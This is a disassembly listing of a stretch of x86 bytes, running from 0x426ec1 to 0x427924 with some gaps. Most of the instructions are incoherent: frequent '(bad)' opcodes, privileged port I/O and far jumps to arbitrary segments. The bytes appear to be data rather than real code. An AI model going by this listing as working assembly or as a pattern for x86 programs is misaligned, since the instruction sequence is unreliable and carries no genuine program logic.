  426ec1:	add    eax,DWORD PTR ds:0xc3e22784
  426ec7:	push   0xfffffff0
  426ec9:	cmp    al,0xcf
  426ecb:	mov    DWORD PTR [ecx],ebx
  426ecd:	int3   
  426ece:	sub    BYTE PTR [ebx+0x70428993],0x8f
  426ed5:	inc    ebp
  426ed6:	pop    es
  426ed7:	sbb    eax,0x1917e868
  426edc:	jns    0x426f2a
  426ede:	cmp    eax,0x90c49a10
  426ee3:	out    0xdf,eax
  426ee5:	mov    ds:0x39e7601d,al
  426eea:	dec    ebp
  426eeb:	imul   esp,DWORD PTR [edi],0x2e
  426eee:	xor    cl,BYTE PTR [esi-0x1]
  426ef1:	cli    
  426ef2:	sbb    eax,DWORD PTR ds:0x58c9af5a
  426ef8:	in     eax,0xbc
  426efa:	or     al,0x6f
  426efc:	test   eax,0x4c16c3b7
  426f01:	fst    QWORD PTR cs:[edi]
  426f04:	sbb    DWORD PTR [edi+0x4c],edi
  426f07:	mov    eax,ds:0x18e1fd18
  426f0c:	fs pop esi
  426f0e:	pop    edx
  426f0f:	jmp    0x0:0x7c
	...
  426f72:	add    BYTE PTR [eax],al
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esi+ecx*8-0x2c54d26f],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	add    edx,DWORD PTR [ebp+0x3a]
  426f8f:	outs   dx,DWORD PTR ds:[esi]
  426f90:	addr16 xchg ebx,eax
  426f92:	lds    ebx,FWORD PTR [edi-0x580a56ec]
  426f98:	inc    edi
  426f99:	scas   al,BYTE PTR es:[edi]
  426f9a:	xor    BYTE PTR [edi+0x398cbb8e],dh
  426fa0:	mov    al,0xd5
  426fa2:	fxch   st(3)
  426fa5:	inc    eax
  426fa6:	sbb    bl,BYTE PTR [ecx-0x60]
  426fa9:	xchg   ebx,eax
  426faa:	cmp    ah,BYTE PTR [edi-0x5]
  426fad:	sbb    BYTE PTR ds:[edx-0x41e50e3a],dh
  426fb4:	in     al,dx
  426fb5:	jecxz  0x426ffa
  426fb7:	(bad)  
  426fb8:	mov    edx,0xaf302502
  426fbd:	sbb    DWORD PTR [esi-0xdf39315],ebx
  426fc3:	js     0x426f5b
  426fc5:	out    0xdd,al
  426fc7:	mov    esi,0xa7cd0277
  426fcc:	sbb    dh,ah
  426fce:	push   esp
  426fcf:	inc    ecx
  426fd0:	jae    0x426fab
  426fd2:	(bad)  
  426fd3:	mov    ebp,0x4f803ca7
  426fd8:	inc    esp
  426fd9:	imul   edi,DWORD PTR ds:0xa8bde142,0x358d31fb
  426fe3:	xchg   esi,eax
  426fe4:	or     ecx,esp
  426fe6:	sub    dh,bh
  426fe8:	iret   
  426fe9:	(bad)  
  426fea:	xor    ecx,edx
  426fec:	mov    dl,0x3b
  426fee:	inc    edi
  426fef:	mov    esi,ds
  426ff1:	icebp  
  426ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ff3:	push   0x2e44f00d
  426ff8:	test   BYTE PTR [ecx-0x21],dl
  426ffb:	imul   ecx,DWORD PTR [edi],0xffffffa2
  426ffe:	aas    
  426fff:	sub    BYTE PTR [edx-0x57],0xc2
  427003:	enter  0x47a7,0x4e
  427007:	repz repz adc al,0xeb
  42700b:	mov    bh,0x64
  42700d:	jae    0x426fb0
  42700f:	iret   
  427010:	ds xchg ecx,eax
  427012:	cmc    
  427013:	inc    ecx
  427014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427015:	xchg   edi,eax
  427016:	or     BYTE PTR [bp+si-0x4b45],0xde
  42701c:	jbe    0x426fb7
  42701e:	addr16 cmp eax,0x84b6c3b6
  427024:	pop    ecx
  427025:	add    eax,0xeb80c460
  42702a:	mov    fs,WORD PTR [ebp+0x13]
  42702d:	loopne 0x426fcd
  42702f:	xchg   ebp,eax
  427030:	push   ss
  427031:	xor    ecx,DWORD PTR [edx+0x754847d2]
  427037:	sub    eax,0x8801582d
  42703c:	xchg   ebx,eax
  42703d:	loopne 0x42708c
  42703f:	test   al,0x7a
  427041:	popf   
  427042:	ret    0x321b
  427045:	pop    ecx
  427046:	xor    BYTE PTR [edi+0x9],bh
  427049:	xchg   ah,bh
  42704b:	cmp    eax,DWORD PTR [edi+0xc]
  42704e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42704f:	xchg   BYTE PTR [eax],dh
  427051:	fs push edi
  427053:	push   esi
  427054:	adc    al,al
  427056:	loopne 0x42700e
  427058:	inc    esi
  427059:	rcr    BYTE PTR [ecx],0x91
  42705c:	xchg   ebx,eax
  42705d:	and    al,0x77
  42705f:	inc    esi
  427060:	inc    esp
  427061:	dec    eax
  427062:	jnp    0x426fed
  427064:	int    0x39
  427066:	xchg   BYTE PTR [edx],ch
  427068:	rcl    BYTE PTR [edi],0xdc
  42706b:	std    
  42706c:	das    
  42706d:	dec    esi
  42706e:	xchg   ebp,eax
  42706f:	pop    ds
  427070:	jne    0x4270a9
  427072:	std    
  427073:	xor    al,0x65
  427075:	mov    eax,0xbd4c855
  42707a:	xchg   ecx,eax
  42707b:	outs   dx,BYTE PTR ds:[esi]
  42707c:	rcl    DWORD PTR [edi],0x97
  42707f:	or     BYTE PTR [ebp+0x483befe3],0x46
  427086:	mov    al,ds:0xa21ebaa6
  42708b:	cmpps  xmm0,XMMWORD PTR [edi],0x87
  42708f:	jb     0x427100
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x98bb9d96
  427102:	dec    ecx
  427103:	xor    al,bl
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	ins    DWORD PTR es:[edi],dx
  42710d:	repz aad 0x5b
  427110:	out    0xd4,al
  427112:	sbb    al,0x17
  427114:	xor    ecx,DWORD PTR ds:0x5f77bfa4
  42711a:	dec    edi
  42711b:	jge    0x4270ec
  42711d:	scas   al,BYTE PTR es:[edi]
  42711e:	hlt    
  42711f:	(bad)  
  427120:	mov    al,ds:0xe703ab9a
  427125:	inc    esi
  427126:	sub    cl,cl
  427128:	push   esp
  427129:	jbe    0x42710b
  42712b:	ds (bad) 
  42712d:	push   ecx
  42712e:	(bad)  
  427131:	and    BYTE PTR [ebx-0x2bf4ee4f],0x39
  427138:	dec    esi
  427139:	xor    eax,0x243cca46
  42713e:	test   al,0x63
  427140:	jno    0x42711f
  427142:	push   0x0
  427144:	jno    0x427104
  427146:	cld    
  427147:	int3   
  427148:	and    al,0x3
  42714a:	jp     0x42715e
  42714c:	or     ah,BYTE PTR [ecx+0x7f]
  42714f:	xchg   ch,bh
  427151:	lods   eax,DWORD PTR ds:[esi]
  427152:	push   0xffffffae
  427154:	sub    bh,ch
  427156:	out    dx,eax
  427157:	xchg   esi,eax
  427158:	fistp  QWORD PTR [ecx+0x416a47e3]
  42715e:	test   al,0x54
  427160:	mov    DWORD PTR [edx],edi
  427162:	sub    DWORD PTR [eax-0x61],ebp
  427165:	jl     0x4270ee
  427167:	xor    BYTE PTR [ecx+0x20],bl
  42716a:	push   0xffffffff
  42716c:	xchg   dh,dl
  42716e:	xchg   ecx,eax
  42716f:	nop
  427170:	mov    bl,0x64
  427172:	test   eax,0x55f1a979
  427177:	dec    eax
  427178:	mov    edx,fs
  42717a:	mov    al,ds:0x231cb3e0
  42717f:	push   edi
  427180:	pushf  
  427181:	out    dx,eax
  427182:	mov    ds:0xfc954b28,al
  427187:	mov    cl,0x25
  427189:	mov    ds:0x48e54f8e,al
  42718e:	in     al,0x9d
  427190:	aad    0xe0
  427192:	pop    es
  427193:	sbb    al,BYTE PTR [ecx-0x12e232f1]
  427199:	pushf  
  42719a:	pop    ds
  42719b:	mov    bl,BYTE PTR [eax+0x34]
  42719e:	out    dx,al
  42719f:	inc    ecx
  4271a0:	jecxz  0x4271e4
  4271a2:	and    al,0x62
  4271a4:	repz or al,0x19
  4271a7:	data16 cmp al,BYTE PTR [ebx+0x3a76c76e]
  4271ae:	adc    ah,ah
  4271b0:	xor    al,0x83
  4271b2:	add    ch,ah
  4271b4:	stos   BYTE PTR es:[edi],al
  4271b5:	(bad)  
  4271b6:	aam    0x5c
  4271b8:	sub    DWORD PTR [eax-0xc49bf2e],ebp
  4271be:	add    DWORD PTR [ebx+0x28],0x4d4ab2b1
  4271c5:	sub    eax,0x4fabd881
  4271ca:	stos   BYTE PTR es:[edi],al
  4271cb:	xchg   DWORD PTR [eax],eax
  4271cd:	enter  0x8b8b,0x1d
  4271d1:	call   0x1740:0xd8c4106
  4271d8:	bound  ebx,QWORD PTR [edx+0x3530117c]
  4271de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271df:	mov    bh,0xa
  4271e1:	ja     0x427255
  4271e3:	(bad)  
  4271e4:	or     eax,edx
  4271e6:	sub    BYTE PTR [ebx+0x71],0x95
  4271ea:	cmc    
  4271eb:	bound  esp,QWORD PTR [ecx+ecx*1]
  4271ee:	mov    al,ds:0x143d5f4
  4271f3:	cmp    eax,0x5cc4ab5b
  4271f8:	mov    dl,BYTE PTR [ecx+0xd]
  4271fb:	fld    QWORD PTR [esi+edi*2-0x75]
  4271ff:	(bad)  [ecx]
  427201:	imul   DWORD PTR [ecx+0x699c5717]
  427207:	out    dx,al
  427208:	jnp    0x427215
  42720a:	cwde   
  42720b:	fsub   QWORD PTR [eax+edx*4]
  42720e:	dec    esp
  42720f:	and    edx,DWORD PTR [eax]
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xcc8330eb,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	lea    ebx,[ebx-0x798db7c9]
  427292:	sub    BYTE PTR [edi-0x1665993b],0x8c
  427299:	outs   dx,DWORD PTR ds:[esi]
  42729a:	ror    BYTE PTR [ebx+esi*4],0xed
  42729e:	(bad)  
  42729f:	fidivr WORD PTR [eax+0x76]
  4272a2:	shr    bh,0xce
  4272a5:	and    ebp,DWORD PTR [esi+edx*8+0x70e8eb09]
  4272ac:	mov    al,0xd5
  4272ae:	pop    esp
  4272af:	ins    BYTE PTR es:[edi],dx
  4272b0:	imul   esi,DWORD PTR [ebp-0x1e347b2c],0x80e69ef1
  4272ba:	adc    edi,edi
  4272bc:	cmp    dl,BYTE PTR [ebp-0x46]
  4272bf:	push   ss
  4272c0:	or     dl,BYTE PTR [esi]
  4272c2:	jl     0x427336
  4272c4:	dec    ebx
  4272c5:	neg    DWORD PTR [ebx]
  4272c7:	icebp  
  4272c8:	idiv   BYTE PTR ds:0x16f45083
  4272ce:	pause  
  4272d0:	dec    edi
  4272d1:	mov    eax,ds:0x15de9198
  4272d6:	in     al,dx
  4272d7:	mov    ch,0x80
  4272d9:	lds    eax,FWORD PTR [ecx+0x6e2a1dea]
  4272df:	and    al,0xd5
  4272e1:	sbb    cl,BYTE PTR [esi+0x4d1f4fef]
  4272e7:	push   ecx
  4272e8:	adc    DWORD PTR [eax+esi*2-0x5177210e],ecx
  4272ef:	out    0x4,eax
  4272f1:	repz neg esp
  4272f4:	test   esp,esi
  4272f6:	cmp    eax,0x9461c8ea
  4272fb:	hlt    
  4272fc:	into   
  4272fd:	mov    esp,0xb7da3dad
  427302:	sub    eax,0xecf06664
  427307:	push   0x36
  427309:	loope  0x4272fc
  42730b:	sahf   
  42730c:	cdq    
  42730d:	mov    esp,0x7df1270f
  427312:	sbb    DWORD PTR [esi+0x7d48d222],0x14a2ae81
  42731c:	data16 xor al,bl
  42731f:	mov    ds:0x251c302,eax
  427324:	mov    DWORD PTR [edi],edi
  427326:	push   ebp
  427327:	daa    
  427328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427329:	or     DWORD PTR [edx+0x50],esp
  42732c:	xor    edi,DWORD PTR [ebx]
  42732e:	add    al,0x29
  427330:	sahf   
  427331:	xor    DWORD PTR [esi],esp
  427333:	scas   eax,DWORD PTR es:[edi]
  427334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427335:	aam    0x79
  427337:	mov    edx,0x848395a3
  42733c:	test   eax,0xf77f4f27
  427341:	push   0x9c4844f5
  427346:	aaa    
  427347:	loopne 0x42733f
  427349:	mov    eax,0x81225edd
  42734e:	outs   dx,BYTE PTR ds:[esi]
  42734f:	jmp    0x42734f
  427351:	xlat   BYTE PTR ds:[ebx]
  427352:	and    edx,eax
  427354:	mov    DWORD PTR [esi],esp
  427356:	in     eax,dx
  427357:	mov    bh,0x32
  427359:	sub    BYTE PTR [eax],ch
  42735b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42735c:	or     al,0x5d
  42735e:	jne    0x42738d
  427360:	adc    bl,BYTE PTR [esi]
  427362:	(bad)  
  427363:	pop    esp
  427364:	outs   dx,DWORD PTR ds:[esi]
  427365:	loope  0x42738f
  427367:	xlat   BYTE PTR ds:[ebx]
  427368:	jnp    0x427388
  42736a:	(bad)  
  42736b:	ficom  DWORD PTR [esi+0x23]
  42736e:	mov    dh,0x39
  427370:	or     edx,DWORD PTR [eax+0x66]
  427373:	jo     0x427366
  427375:	js     0x4273c4
  427377:	jp     0x427339
  427379:	sub    eax,0xa9b5a112
  42737e:	or     BYTE PTR [ebx-0x50],al
  427381:	cdq    
  427382:	clc    
  427383:	js     0x4273b6
  427385:	sbb    dh,dh
  427387:	iret   
  427388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427389:	mov    bh,BYTE PTR [eax-0x28]
  42738c:	test   al,0xb8
  42738e:	add    dh,BYTE PTR [ebp+0xd9]
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebx,DWORD PTR [edx]
  427401:	stc    
  427402:	sbb    eax,0x1a3e29d
  427407:	add    BYTE PTR ds:0x8a000001,al
  42740d:	mov    esi,0xb6298891
  427412:	mov    cx,0x88e0
  427416:	push   edx
  427417:	std    
  427418:	test   eax,0xa54b5154
  42741d:	fwait
  42741e:	daa    
  42741f:	jae    0x427469
  427421:	retf   0x5871
  427424:	xor    al,0xd9
  427426:	fst    QWORD PTR [edi]
  427428:	fsubr  QWORD PTR [edx-0x51c393d4]
  42742e:	aas    
  42742f:	lods   eax,DWORD PTR ds:[esi]
  427430:	cmp    DWORD PTR [ebp-0x18],edx
  427433:	dec    esi
  427434:	add    eax,0x3c24f57b
  427439:	bswap  ecx
  42743b:	test   al,0xdf
  42743d:	adc    al,0x75
  42743f:	sbb    edx,eax
  427441:	push   ebp
  427442:	inc    ecx
  427443:	arpl   WORD PTR [edi],dx
  427445:	adc    ah,0x7c
  427448:	fiadd  WORD PTR [edi]
  42744a:	popf   
  42744b:	cmp    BYTE PTR [edx],cl
  42744d:	mov    esi,0x96bac303
  427452:	call   0x307:0x3f501699
  427459:	popf   
  42745a:	jae    0x427498
  42745c:	cmp    BYTE PTR [ebx-0xe],ah
  42745f:	loopne 0x4274b0
  427461:	sub    BYTE PTR [ebx],ah
  427463:	or     BYTE PTR [ebx+0x2d],bh
  427466:	add    BYTE PTR [ebx],0x10
  427469:	arpl   WORD PTR [ebx],di
  42746b:	dec    ebp
  42746c:	mov    BYTE PTR [ebp+0x116fe90b],bl
  427472:	mov    eax,ds:0xf23137de
  427477:	jno    0x4274a0
  427479:	sti    
  42747a:	mov    ebx,0xd2db103d
  42747f:	sub    ebp,DWORD PTR [ecx-0xf]
  427482:	sbb    ebx,ebp
  427484:	push   eax
  427485:	xlat   BYTE PTR ds:[ebx]
  427486:	shl    DWORD PTR [ebp+0x30],0x19
  42748a:	sub    BYTE PTR [ecx-0x2c7c5ce0],bl
  427490:	or     ebp,DWORD PTR [edi-0x50bc8d2f]
  427496:	dec    edi
  427497:	sub    eax,0x967ab74
  42749c:	inc    esp
  42749d:	xlat   BYTE PTR ds:[ebx]
  42749e:	mov    esp,0x6f0bc667
  4274a3:	aad    0x65
  4274a5:	jns    0x4274f4
  4274a7:	mov    eax,ds:0xcdb47ba4
  4274ac:	je     0x4274e4
  4274ae:	and    ch,bh
  4274b0:	xor    dl,cl
  4274b2:	and    dl,BYTE PTR [edi]
  4274b4:	jmp    0x59eb:0x6116087
  4274bb:	push   eax
  4274bc:	pop    ebx
  4274bd:	jge    0x42750c
  4274bf:	mov    ?,ecx
  4274c1:	lahf   
  4274c2:	aaa    
  4274c3:	lods   al,BYTE PTR ds:[esi]
  4274c4:	in     al,0x5e
  4274c6:	faddp  st(0),st
  4274c8:	sub    DWORD PTR [ebx],0xce93abdf
  4274ce:	add    DWORD PTR [esi+0x15],ebx
  4274d1:	and    eax,0x83eb0c30
  4274d6:	shl    DWORD PTR [ebx],0xc0
  4274d9:	loope  0x427497
  4274db:	sub    DWORD PTR [edx],edi
  4274dd:	jle    0x427520
  4274df:	push   ebp
  4274e0:	cmp    DWORD PTR [ebp+ecx*2-0xe],ebx
  4274e4:	jmp    0x57c5:0x25e73fea
  4274eb:	cmp    ch,BYTE PTR [ebx-0x20]
  4274ee:	enter  0x3d3b,0x9c
  4274f2:	fmul   QWORD PTR [edi]
  4274f4:	(bad)  
  4274f5:	cld    
  4274f6:	push   cs
  4274f7:	fld    QWORD PTR [ecx-0x7c9e3d48]
  4274fd:	cmp    esi,DWORD PTR ds:0x93c74b72
  427503:	sbb    dl,BYTE PTR [edi-0x5f]
  427506:	fsubr  st(7),st
  427508:	sbb    DWORD PTR [edi],esp
  42750a:	(bad)  [ecx+0x61]
  42750d:	into   
  42750e:	stc    
  42750f:	out    0xb9,eax
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	push   edi
  427581:	and    DWORD PTR [ebx+0x1a4e74d],edx
  427587:	add    BYTE PTR ds:0x9f000001,al
  42758d:	enter  0x3d9f,0x3a
  427591:	rcl    BYTE PTR [eax-0x1a],cl
  427594:	retf   
  427595:	shl    BYTE PTR [ebx],0x8
  427598:	sbb    DWORD PTR [edx+esi*1+0x364b27f9],edx
  42759f:	or     DWORD PTR [eax+eax*8-0x99b796a],esp
  4275a6:	ss jno 0x42753e
  4275a9:	in     al,0xe1
  4275ab:	sbb    ebx,edi
  4275ad:	jo     0x42755a
  4275af:	stc    
  4275b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275b1:	cmp    al,0x98
  4275b3:	(bad)  
  4275b5:	adc    BYTE PTR [bx+si+0x40],bh
  4275b9:	jmp    0x427580
  4275bb:	adc    ah,BYTE PTR [ebx-0x57]
  4275be:	outs   dx,DWORD PTR ds:[esi]
  4275bf:	ja     0x4275be
  4275c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275c2:	std    
  4275c3:	inc    ebp
  4275c4:	mov    al,ds:0x24a9bdc9
  4275c9:	push   ds
  4275ca:	test   al,0x1a
  4275cc:	xor    al,0x61
  4275ce:	lea    esp,[ebp+0x6c27cae0]
  4275d4:	loopne 0x427615
  4275d6:	test   BYTE PTR [eax],dl
  4275d8:	nop
  4275d9:	xor    eax,0x3c0df610
  4275de:	ds out 0x93,al
  4275e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275e2:	gs xchg edi,eax
  4275e4:	ret    
  4275e5:	test   eax,0x441d8997
  4275ea:	jmp    0x42765a
  4275ec:	cmp    bl,BYTE PTR [ebx-0x3b69571c]
  4275f2:	jp     0x427597
  4275f4:	cs int 0xcc
  4275f7:	scas   al,BYTE PTR es:[edi]
  4275f8:	push   edi
  4275f9:	(bad)  
  4275fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275fb:	dec    edi
  4275fc:	cmc    
  4275fd:	add    al,0xd3
  4275ff:	jbe    0x4275f8
  427601:	imul   edx,ecx,0xb2ea1b4c
  427607:	or     edx,edx
  427609:	out    dx,al
  42760a:	add    eax,0x25660ba4
  42760f:	iret   
  427610:	jg     0x4275b5
  427612:	arpl   WORD PTR [ebx+edi*8+0x38],dx
  427616:	dec    esi
  427617:	retf   
  427618:	mov    DWORD PTR [edx+0x21],ecx
  42761b:	(bad)  
  42761c:	repz dec edx
  42761e:	pop    eax
  42761f:	outs   dx,DWORD PTR ds:[esi]
  427620:	outs   dx,DWORD PTR ds:[esi]
  427621:	inc    edx
  427622:	or     al,0x1b
  427624:	leave  
  427625:	stc    
  427626:	sub    DWORD PTR [esi-0x6af75300],esp
  42762c:	stos   BYTE PTR es:[edi],al
  42762d:	clc    
  42762e:	add    eax,0xb34fc20
  427633:	ror    BYTE PTR [ebp-0x8],1
  427636:	fcomp  DWORD PTR [edx+0x112d38b4]
  42763c:	sub    DWORD PTR [edi-0x5e],edx
  42763f:	cmp    dh,BYTE PTR [edi]
  427641:	sahf   
  427642:	dec    edi
  427643:	dec    edi
  427644:	scas   eax,DWORD PTR es:[edi]
  427645:	pop    ds
  427646:	push   0x7ca5f603
  42764b:	cli    
  42764c:	push   ecx
  42764d:	dec    ecx
  42764e:	sbb    eax,0x9b0264bf
  427653:	sub    DWORD PTR [esi-0x1c],edx
  427656:	sub    sp,WORD PTR [ebp-0xf]
  42765a:	cdq    
  42765b:	std    
  42765c:	outs   dx,BYTE PTR ds:[esi]
  42765d:	outs   dx,BYTE PTR ds:[esi]
  42765e:	cwde   
  42765f:	xor    eax,0x80dad57c
  427664:	mov    esi,0x9dc00538
  427669:	rcr    DWORD PTR [ebp-0x76],0xa1
  42766d:	add    BYTE PTR [eax],cl
  42766f:	jp     0x4275f9
  427671:	std    
  427672:	std    
  427673:	mov    bl,0xba
  427675:	sub    al,0x43
  427677:	and    esi,DWORD PTR [esi]
  427679:	jne    0x42764d
  42767b:	mov    esp,0x46317a5e
  427680:	jl     0x427665
  427682:	dec    esp
  427683:	js     0x427642
  427685:	clts   
  427687:	fsub   QWORD PTR [eax+0x370ee8f9]
  42768d:	xchg   ebp,eax
  42768e:	scas   eax,DWORD PTR es:[edi]
  42768f:	ud2    
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstenv [eax-0x1399e1bc]
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0xf7000001
  42770d:	cs in  al,dx
  42770f:	mov    edx,0x71524506
  427714:	int    0xc1
  427716:	cmp    BYTE PTR [ebp+0x655cbac5],ch
  42771c:	push   es
  42771d:	add    bl,ch
  42771f:	shl    DWORD PTR ds:0x427425d4,1
  427725:	inc    esi
  427726:	mov    esp,0x975a357a
  42772b:	jmp    0x4276c1
  42772d:	and    ecx,ebp
  42772f:	out    0x24,al
  427731:	pop    esp
  427732:	fst    QWORD PTR [ebp+0x46]
  427735:	jb     0x4276d8
  427737:	mov    cl,0x6
  427739:	int    0x88
  42773b:	rol    BYTE PTR [esi],0x76
  42773e:	mov    edx,ebp
  427740:	adc    edx,0x36
  427743:	mov    BYTE PTR [ecx],cl
  427745:	sti    
  427746:	fs pop es
  427748:	ins    DWORD PTR es:[edi],dx
  427749:	mov    WORD PTR [ecx],fs
  42774b:	imul   ecx,edi,0xef02116f
  427751:	xchg   esi,eax
  427752:	data16 xlat BYTE PTR ds:[ebx]
  427754:	fild   WORD PTR [edi]
  427756:	sub    eax,0xda627a16
  42775b:	pop    es
  42775c:	das    
  42775d:	iret   
  42775e:	and    edx,ebx
  427760:	xchg   edx,eax
  427761:	and    eax,0x81a5473e
  427766:	in     eax,0x2b
  427768:	cmp    al,BYTE PTR [esp+eax*8]
  42776b:	and    dh,BYTE PTR [esi-0x49]
  42776e:	scas   al,BYTE PTR es:[edi]
  42776f:	dec    ecx
  427770:	mov    edx,0xdc3f1350
  427775:	fwait
  427776:	jnp    0x42770f
  427778:	xchg   bh,ch
  42777a:	std    
  42777b:	mov    ebx,0xb8b8e52d
  427780:	in     al,dx
  427781:	aaa    
  427782:	pop    edi
  427783:	sahf   
  427784:	dec    ebp
  427785:	adc    DWORD PTR ds:0x89ce2b31,esi
  42778b:	outs   dx,BYTE PTR ds:[esi]
  42778c:	and    ebx,ebp
  42778e:	pop    esp
  42778f:	jg     0x427715
  427791:	mov    esp,0xc428a198
  427796:	lock dec esp
  427798:	mov    ecx,esi
  42779a:	push   ebp
  42779b:	sub    al,0x8b
  42779d:	gs pop eax
  42779f:	add    DWORD PTR [bp-0x22],0xffffffdf
  4277a4:	sahf   
  4277a5:	lahf   
  4277a6:	pop    ss
  4277a7:	push   cs
  4277a8:	loop   0x427829
  4277aa:	nop
  4277ab:	pop    ebp
  4277ac:	push   edi
  4277ad:	mov    ds:0x375e8f88,al
  4277b2:	sub    eax,0x47809dac
  4277b7:	push   0x447f508b
  4277bc:	jo     0x4277e3
  4277be:	fcmovnb st,st(3)
  4277c0:	pop    ebx
  4277c1:	cdq    
  4277c2:	push   ss
  4277c3:	mov    esp,0x27c0f90d
  4277c8:	rcr    BYTE PTR [edx+0xb],0x21
  4277cc:	ja     0x4277ca
  4277ce:	pop    ebx
  4277cf:	adc    esi,edx
  4277d1:	mov    ch,0x3
  4277d3:	outs   dx,BYTE PTR ds:[esi]
  4277d4:	(bad)  
  4277d5:	dec    ebx
  4277d6:	lods   al,BYTE PTR ds:[esi]
  4277d7:	jmp    0x427807
  4277d9:	add    ebx,DWORD PTR [edx+0x6dd5b6a0]
  4277df:	xchg   DWORD PTR ds:0xb3392476,ebx
  4277e5:	mov    WORD PTR ds:0x5ca62343,ds
  4277eb:	mov    ch,0xa5
  4277ed:	jmp    0x42777d
  4277ef:	mov    gs,esi
  4277f1:	push   eax
  4277f2:	mov    dh,0xd8
  4277f4:	xor    edi,ebx
  4277f6:	out    0x66,eax
  4277f8:	pop    ebx
  4277f9:	std    
  4277fa:	xor    BYTE PTR [ebx],ah
  4277fc:	or     al,bh
  4277fe:	lods   al,BYTE PTR ds:[esi]
  4277ff:	inc    ecx
  427800:	frstor [esi-0x5]
  427803:	sahf   
  427804:	aaa    
  427805:	(bad)  
  427806:	paddusw mm5,QWORD PTR [ebx+ecx*4+0x41]
  42780b:	mov    ebx,DWORD PTR [edi]
  42780d:	aad    0xd4
  42780f:	dec    edx
  427810:	sub    al,BYTE PTR [eax]
	...
  427872:	add    BYTE PTR [eax],al
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	imul   ecx,DWORD PTR [ebp-0x590ebd49],0x1050001
  42788a:	add    BYTE PTR [eax],al
  42788c:	mov    ch,0x17
  42788e:	pushf  
  42788f:	arpl   WORD PTR [ebp+0x1c],ax
  427892:	or     eax,DWORD PTR [edi+0x38]
  427895:	mov    al,0x16
  427897:	fld    TBYTE PTR [ebp-0x4daa3cc3]
  42789d:	ins    BYTE PTR es:[edi],dx
  42789e:	pop    ss
  42789f:	xchg   DWORD PTR fs:[edx+0x655a8a1b],ebp
  4278a6:	push   cs
  4278a7:	imul   ecx,DWORD PTR [ebx],0x4e
  4278aa:	push   edx
  4278ab:	add    eax,0x8db849b1
  4278b0:	mov    al,ds:0x8b45cee2
  4278b5:	jg     0x4278e4
  4278b7:	pop    ecx
  4278b8:	gs cmp ebp,ebp
  4278bb:	outs   dx,BYTE PTR ds:[esi]
  4278bc:	mov    ebx,0x2f0e3434
  4278c1:	rol    DWORD PTR [eax+0x22],1
  4278c4:	rcl    BYTE PTR [edx+edx*8+0x17e0e572],1
  4278cb:	idiv   cl
  4278cd:	sbb    al,0x98
  4278cf:	sbb    BYTE PTR [ecx],bl
  4278d1:	cwde   
  4278d2:	pop    eax
  4278d3:	jmp    0x8d78:0x437cd683
  4278da:	lods   eax,DWORD PTR ds:[esi]
  4278db:	add    eax,0xef6d9273
  4278e0:	sti    
  4278e1:	fwait
  4278e2:	(bad)
  4278e5:	mov    bh,BYTE PTR [edi]
  4278e7:	nop
  4278e8:	ss mov ebx,0xe3b2cd4e
  4278ee:	sbb    BYTE PTR [esi-0x76],cl
  4278f1:	mov    fs,WORD PTR [eax-0x38]
  4278f4:	push   edi
  4278f5:	add    BYTE PTR [eax-0x2b57d0bc],0x27
  4278fc:	push   esi
  4278fd:	or     DWORD PTR [esi],ebp
  4278ff:	pop    ss
  427900:	in     eax,dx
  427901:	jecxz  0x42792f
  427903:	xor    esi,DWORD PTR [ecx+0x20a3e3ae]
  427909:	leave  
  42790a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42790b:	in     al,dx
  42790c:	sbb    bl,BYTE PTR [esi]
  42790e:	enter  0xbfa,0x1f
  427912:	(bad)  
  427913:	rcl    BYTE PTR [edi-0x532f5e1c],0xdd
  42791a:	lahf   
  42791b:	mov    ds:0x4922a07c,eax
  427920:	mov    dl,0x59
  427922:	or     ch,BYTE PTR [edx]
  427924:	pop    ss
